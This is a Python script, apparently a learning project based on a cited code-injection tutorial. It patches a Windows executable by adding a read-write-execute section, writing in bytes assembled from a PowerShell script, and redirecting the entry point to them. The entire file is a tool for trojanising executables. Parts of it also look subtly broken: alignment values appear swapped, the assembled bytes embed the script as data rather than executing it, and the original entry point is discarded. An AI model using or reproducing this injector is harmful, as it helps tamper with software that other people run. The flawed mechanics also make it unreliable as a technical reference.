#Reference: https://axcheron.github.io/code-injection-with-python/

import pefile
import sys
from os import system
import struct

def align(size, alignment):
    return (((size + alignment - 1) // alignment) * alignment)

def addSection(fileName, sectionSize, injectedFile):
    '''add a new section with specified size at the end of the executable'''

    print("[*] Adding new section")
    pe = pefile.PE(fileName)
    newSectionName = b".frost"
    newSectionName += b"\x00" * (8 - len(newSectionName))    #name of section must be 8 bytes

    #calculate offset and size of new section
    # it seems virtualSize doesn't need alignment, but just to be sure
    virtualSize = align(sectionSize, pe.OPTIONAL_HEADER.FileAlignment)
    rawSize = align(sectionSize, pe.OPTIONAL_HEADER.SectionAlignment)
    characteristics = 0xE0000020  # READ | WRITE | EXECUTE | CODE

    numberOfSections = pe.FILE_HEADER.NumberOfSections

    virtualOffset = align(pe.sections[numberOfSections - 1].VirtualAddress +
                          pe.sections[numberOfSections - 1].Misc_VirtualSize,
                          pe.OPTIONAL_HEADER.SectionAlignment)
    rawOffset = align(pe.sections[numberOfSections - 1].PointerToRawData +
                      pe.sections[numberOfSections - 1].SizeOfRawData,
                      pe.OPTIONAL_HEADER.FileAlignment)

    newSectionEntry = pe.sections[numberOfSections - 1].get_file_offset() + 40

    #add a new entry to section header table
    #an entry in the section header table follows the IMAGE_SECTION_HEADER structure
    pe.set_bytes_at_offset(newSectionEntry, newSectionName)
    pe.set_dword_at_offset(newSectionEntry + 8, virtualSize)
    pe.set_dword_at_offset(newSectionEntry + 12, virtualOffset)
    pe.set_dword_at_offset(newSectionEntry + 16, rawSize)
    pe.set_dword_at_offset(newSectionEntry + 20, rawOffset)
    pe.set_bytes_at_offset(newSectionEntry + 24, b"\x00"*12)
    pe.set_dword_at_offset(newSectionEntry + 36, characteristics)

    # Edit the value in the File and Optional headers
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = virtualSize + virtualOffset
    pe.write(injectedFile)

    #resize the executable
    f = open(injectedFile, "ab")
    f.write(b"\x00" * rawSize)
    f.close()

def extractShellcode(filename):
    '''A simple COFF parser to extract the shellcode from the COFF file'''
    with open(filename, "rb") as f:
        f.seek(16, 0)
        optionalHeaderSize = struct.unpack("<l", f.read(4))[0]
        f.seek(20 + optionalHeaderSize, 0)  #go to the section header

        #we don't need to loop through the file to find the .text section
        #because there is only 1 section

        f.seek(16, 1)
        shellcodeSize = struct.unpack("<l", f.read(4))[0]   #read the s_size field of the structure
        shellcodeAddr = struct.unpack("<l", f.read(4))[0]   #read the s_scnptr field of the structure

        f.seek(shellcodeAddr, 0)
        shellcode = f.read(shellcodeSize)
        return shellcode

def craftShellcode(scriptPath):
    '''write the ps script to an asm file and compile it to create shellcode'''

    print("[*] Reading powershell script")
    script = ""
    with open(scriptPath, "r") as f:
        script = f.read().strip('\n')


    asmTemplate = '''mov eax, 1 
                xor ecx, ecx
                db \"%s\", 0'''

    #compile the shellcode to a COFF file then extract it
    print("[*] Compiling shellcode")
    asmFile = open("shellFile.S", "w")
    asmFile.write(asmTemplate %(script))
    asmFile.close()
    system("nasm -f win64 shellFile.S -o compiled.obj")
    compiledCode = extractShellcode("compiled.obj")
    system("del /f shellFile.S")
    system("del /f compiled.obj")
    return compiledCode

def injectShellcode(fileName, shellcode):
    '''write shellcode to the newly created section, then change the entry point'''
    print("[*] Injecting shellcode")

    pe = pefile.PE(fileName)
    rawOffset = pe.sections[pe.FILE_HEADER.NumberOfSections - 1].PointerToRawData
    #print(pe.sections[pe.FILE_HEADER.NumberOfSections - 1].Name)
    pe.set_bytes_at_offset(rawOffset, shellcode)

    print("[*] Changing entry point")
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.sections[pe.FILE_HEADER.NumberOfSections - 1].VirtualAddress
    print("\tNew entry point: 0x%02x"%(pe.OPTIONAL_HEADER.AddressOfEntryPoint))

    pe.write(fileName)


if __name__ == "__main__":
    if (len(sys.argv) < 3):
        print("Usage: python injector.py <peFile> <psScript>")
        exit(1)

    peFilePath = sys.argv[1]
    psScriptPath = sys.argv[2]

    shellcode = craftShellcode(psScriptPath)
    outputFile = "modified.exe"
    addSection(peFilePath, len(shellcode), outputFile)
    injectShellcode(outputFile, shellcode)
